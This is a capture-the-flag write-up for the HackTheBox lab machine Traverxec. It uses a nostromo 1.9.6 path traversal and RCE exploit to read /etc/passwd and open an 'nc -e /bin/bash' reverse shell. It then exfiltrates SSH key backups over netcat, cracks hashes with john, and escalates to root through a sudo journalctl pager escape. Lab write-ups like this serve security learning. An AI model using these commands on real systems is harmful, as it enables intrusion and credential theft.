# Traverxec
Box IP **10.10.10.165**


### Nmap scan

```bash
$ nmap -sC -sV -T5 -v traverxec.htb
```

### Services
```bash
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
```

Surfing to https://10.10.10.165 a website shows up

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Traverxec/src/1.png" alt="1" />
</p>


### Fuzzing

Trying to fuzz for web directories, but nothing shows up
```bash
$ gobuster dir -u http://10.10.10.165 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -o gobuster.log
```


### Getting a shell

Searching for **nostromo 1.9.6** we find a RCE vulnerability
```bash
$ searchsploit nostromo
nostromo 1.9.6 - Remote Code Execution | exploits/multiple/remote/47837.py
$ searchsploit -m exploits/multiple/remote/47837.py
```

Playing with the payload we notice first a directory traversal vulnerability.
By requesting http://10.10.10.165/.%0D./ the server replies with the parent directory of the **server root**

<p align="center">
  <img src="https://github.com/lorenzoinvidia/CTFs-Writeups/blob/master/HackTheBox/b2r/Traverxec/src/2.png" alt="1" />
</p>


This means we can request arbitrary file from the file system, such as **/etc/passwd**
```bash
$ curl http://10.10.10.165/.%0D./.%0D./.%0D./etc/passwd
root:x:0:0:root:/root:/bin/bash
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
david:x:1000:1000:david,,,:/home/david:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

```

The exploit execute a commands passed as argument in the **/bin/sh** shell

```bash
$ python 47837.py 10.10.10.165 80 "id"
Sending:
POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0
Content-Length: 1

echo
echo
id 2>&1
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2020 19:54:08 GMT
Server: nostromo 1.9.6
Connection: close


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can open a reverse shell

```bash
$ python 47837.py 10.10.10.165 80 "nc -e /bin/bash 10.10.14.55 4444"

$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.55] from (UNKNOWN) [10.10.10.165] 37046
whoami
www-data
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$
```

### Lateral movement

The **/etc/passwd** ﬁle reveals a user named **david**.

Looking up the Nostromo doc, we find that the document root is **/var/nostromo/**.

The folder **/var/nostromo/conf** contains the web server conﬁguration ﬁles.

We find interesting information in **nhttpd.conf** and **.htpasswd**.

```bash
www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/nhttpd.conf
cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www

www-data@traverxec:/usr/bin$ cat /var/nostromo/conf/.htpasswd  
cat /var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
www-data@traverxec:/usr/bin$
```

The cracked hash is **Nowonly4me** but it turns out to be of no use.

The HOMEDIRS indicates **public_www** folder in the user's home directory.

David's home is not readble but this dir is accessible and contains a backup file.

```bash
www-data@traverxec:/home/david$ ls
ls
ls: cannot open directory '.': Permission denied

www-data@traverxec:/home/david$ ls public_www
ls public_www
index.html  protected-file-area

www-data@traverxec:/home/david$ cd public_www/protected-file-area
cd public_www/protected-file-area

www-data@traverxec:/home/david/public_www/protected-file-area$ ls
ls
backup-ssh-identity-files.tgz
```

We get the file
```bash
$ nc -nlvp 1234 < bk.tgz

www-data@traverxec:/home/david$ nc 10.10.14.55 1234 < /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz

$ tar -xvf bk.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

The backup contains the **ssh keys** of david.

The sk is encrypted and we use john for that.

```bash
$ chmod 400 id_rsa
$ locate ssh2john
$ python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
$ john -wordlist:/usr/share/wordlists/rockyou.txt id_rsa.hash
```

The extracted password is **hunter**.

Now we can ssh as david and get the user flag in **/home/david**

```bash
$ ssh -i id_rsa david@10.10.10.165
The authenticity of host '10.10.10.165 (10.10.10.165)' can't be established.
ECDSA key fingerprint is SHA256:CiO/pUMzd+6bHnEhA2rAU30QQiNdWOtkEPtJoXnWzVo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.165' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ pwd
/home/david
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ wc user.txt
 1  1 33 user.txt
```


### Privilege Escalation

The **bin** directory contains the **server-stats.sh** file.

```bash
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

The user david can run journalctl with root privileges. This coomand is [exploitable](https://gtfobins.github.io/gtfobins/journalctl/) since invokes the default pager **less**, which can run shell commands by prefixing **!**.

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Thu 2020-04-16 13:59:24 EDT, end at Thu 2020-04-16 15:02:30 EDT. --
Apr 16 13:59:28 traverxec systemd[1]: Starting nostromo nhttpd server...
Apr 16 13:59:28 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) afte
Apr 16 13:59:28 traverxec nhttpd[458]: started
Apr 16 13:59:28 traverxec nhttpd[458]: max. file descriptors = 1040 (cur) / 1040 (max)
Apr 16 13:59:28 traverxec systemd[1]: Started nostromo nhttpd server.
!/bin/sh
# whoami
root
```

The root flag is located in **/root**


If you liked this write-up, please leave a respect on my hackthebox

![htbbadge](https://www.hackthebox.eu/badge/image/77747)
